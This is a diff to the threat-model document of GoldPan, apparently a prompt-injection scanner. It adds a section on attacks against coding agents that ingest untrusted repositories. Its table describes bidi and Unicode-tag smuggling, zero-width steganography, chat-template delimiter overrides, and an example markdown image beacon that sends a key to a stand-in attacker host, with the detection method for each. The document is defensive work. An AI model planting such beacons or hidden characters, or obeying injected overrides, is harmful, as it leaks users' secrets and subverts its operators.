@@ -66,7 +66,30 @@ Every document processed by GoldPan or returned via MCP tools (`pan_url`, `pan_f
 
 ---
 
-## 5. Out-of-Scope Threats & Residual Risks
+## 5. Repository Ingestion & Codebase Prompt Injection Defense (`goldpan scan`)
+
+With GoldPan v3.3.0, the firewall boundary expands from web and document RAG ingestion to **entire source code repositories**. When developer agents (Claude Code, Cursor, Copilot, Antigravity) ingest untrusted third-party repositories or packaged context files (e.g., via Repomix), malicious actors can compromise agent behavior through code-level injection vectors:
+
+| Codebase Threat Vector | Attack Mechanism | Detection & Defense |
+| :--- | :--- | :--- |
+| **Trojan Source (Bidi Overrides)** | Invisible Bidirectional control characters (`U+202A`–`U+202E`, `U+2066`–`U+2069`) reordering visually rendered tokens vs. AST execution order | Line- and column-exact flagging; stripped in `sanitize` mode |
+| **ASCII Smuggling (Unicode Tags)** | Characters from the Unicode Tag Block (`U+E0000`–`U+E007F`) embedded in docstrings or comments, decoded invisibly by LLM tokenizers | 100% detection rate across all code files |
+| **Zero-Width Steganography** | `U+200B` (ZWSP), `U+200C` (ZWNJ), or stray `U+200D` (ZWJ) inserted between variable names or within strings | Regex engine whitelists legitimate multi-codepoint emoji sequences (e.g. `👨‍👩‍👧‍👦`, `🧑‍💻`) while flagging stray zero-width chars |
+| **Markdown Exfiltration Beacons** | Image tags (`![tracker](https://evil.org/log?key=...)`) in `README.md` or PR templates designed to trigger automated HTTP fetch with leaked tokens | Flagged and converted to neutral `[Blocked External Image Beacon]` placeholder |
+| **Delimiters & Semantic Overrides** | ChatML (`<|im_start|>`), Llama (`[INST]`), or imperative overrides outside fenced code | Profile-aware: fenced code blocks and inline code are permitted for documentation (`severity="info"`), while unescaped root directives are blocked (`severity="suspicious"`) |
+
+### Code Profile vs. Text Profile
+- **`profile="code"` (Default for `goldpan scan`):** Parses syntax trees and fenced code blocks (` ``` ` and `~~~`). Distinguishes legitimate coding/docs examples (e.g. documentation explaining prompt injection formats) from active, unescaped injection vectors.
+- **Packaging Workflow Synergy:** GoldPan does not duplicate generic file packaging tools (like Repomix). Instead, it acts as the security verification layer:
+  ```bash
+  goldpan scan . --list-clean > clean_manifest.txt
+  repomix --include "$(cat clean_manifest.txt)"
+  ```
+- **SARIF 2.1.0 Standard:** Emits native OASIS SARIF (`goldpan scan . --format sarif`) for direct integration into GitHub Code Scanning alerts and CI/CD security pipelines.
+
+---
+
+## 6. Out-of-Scope Threats & Residual Risks
 
 In accordance with epistemic rigor, GoldPan explicitly documents what this firewall **does not** claim to solve:
 
